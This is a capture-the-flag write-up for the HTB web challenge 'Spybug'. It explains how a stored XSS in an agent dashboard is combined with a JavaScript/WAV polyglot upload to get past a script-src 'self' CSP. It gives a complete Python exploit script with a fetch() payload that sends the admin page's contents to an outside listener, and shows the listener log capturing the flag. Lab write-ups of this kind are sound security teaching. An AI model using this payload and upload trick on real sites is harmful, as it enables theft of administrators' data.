# [Web - medium] Spybug

This webapp consists in an API written in JS, allowing agents (an agent is a tuple (hostname,platform,arch)) to register themselves, and upload WAV sounds to the `/uploads` folder. There is also a bot loggin in as admin every minute and checking the main dashboard which displays agent information.

The admin username contains the flag and is displayed in the dashboard as welcome message.

This challenge consists in exploiting 2 vulnerabilities:

- the agent information is displayed as-is in the dashboard: it is vulnerable to XSS, which will be triggered by the admin bot every minute. However the webapp is using CSP (Content Security Policy) with `script-src 'self'`: the XSS must only include local file scripts. That's where the second vulnerability will be useful
```
				tbody
					each agent in agents
						tr
							td= agent.identifier
							td !{agent.hostname}
							td !{agent.platform}
							td !{agent.arch}
```
```js
application.use((req, res, next) => {
  res.setHeader("Content-Security-Policy", "script-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none';");
```
- the uploaded WAV sounds in `/uploads` can be anything, as long as:
  - the uploaded file contains (anywhere in the file) the WAV magic bytes
  - the content type is `audio/wave`
  - the filename ends with `.wav`
```js
const multerUpload = multer({
  storage: storage,
  fileFilter: (req, file, cb) => {
    if (
      file.mimetype === "audio/wave" &&
      path.extname(file.originalname) === ".wav"
[...]
router.post(
  "/agents/upload/:identifier/:token",
  authAgent,
  multerUpload.single("recording"),
  async (req, res) => {
    if (!req.file) return res.sendStatus(409);
    const filepath = path.join("./uploads/", req.file.filename);
    const buffer = fs.readFileSync(filepath).toString("hex");
    if (!buffer.match(/52494646[a-z0-9]{8}57415645/g)) {
        fs.unlinkSync(filepath);
      return res.sendStatus(400);
    }
    await createRecording(req.params.identifier, req.file.filename);
    res.send(req.file.filename);
```
The path to victory is to:

- register a new agent, get its `uuid`
- upload the agent WAV file using that `uuid`. The WAV file will be in fact a Javascript script exfiltrating (using `fetch()`) the content of the admin dashboard, but meets all the upload requirements. The most difficult is that the file must contain the WAV magic bytes `/52494646[a-z0-9]{8}57415645/g`. It can be anywhere in the file, so at the end of the Javascript file as comment is fine.
- update the agent information, so that the `hostname` is the XSS including the uploaded file
- use a HTTP listener to get the exfiltrated page content

The final script is:

```python
import requests
import json

endpoint = "http://68.183.37.122:30812"

s = requests.Session()
response = s.get(endpoint + '/agents/register')
agent = json.loads(response.text)
print(agent)
identifier = agent['identifier']
token = agent['token']

js_payload = "fetch('http://1.2.3.4:4444/exfil' + '?' + document.body.textContent);//"
files={'recording': ('aaa.wav', js_payload.encode('utf8') + bytearray.fromhex('52494646aaaaaaaa57415645'), 'audio/wave')}
response = s.post(endpoint + '/agents/upload/{}/{}'.format(identifier, token), files=files)
javascript = response.text

details = {
    'hostname': "<script src='/uploads/{}'></script>".format(javascript),
    'platform': "bbb",
    'arch': 'bbb'
}

response = s.post(endpoint + '/agents/details/{}/{}'.format(identifier, token), json = details)
print(response.text)
```

And its output:

```bash
$ python lol.py
{'identifier': 'aa9cbafb-16c9-4426-8720-40964e6449fa', 'token': '51ac9a77-cc46-416c-863b-f752c442e6d5'}
OK
```

And waiting for our XSS callback from the admin bot:

```bash
pi@raspberrypi:/tmp/lol $ python -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
68.183.37.122 - - [25/Mar/2023 07:41:38] code 404, message File not found
68.183.37.122 - - [25/Mar/2023 07:41:38] "GET /exfil?%C2%A0Spybug%20v1Log-outWelcome%20back%20HTB{p01yg10t5_4nd_35p10n4g3}%C2%A0AgentsIDHostnamePlatformArchaa9cbafb-16c9-4426-8720-40964e6449fa HTTP/1.1" 404 -
```
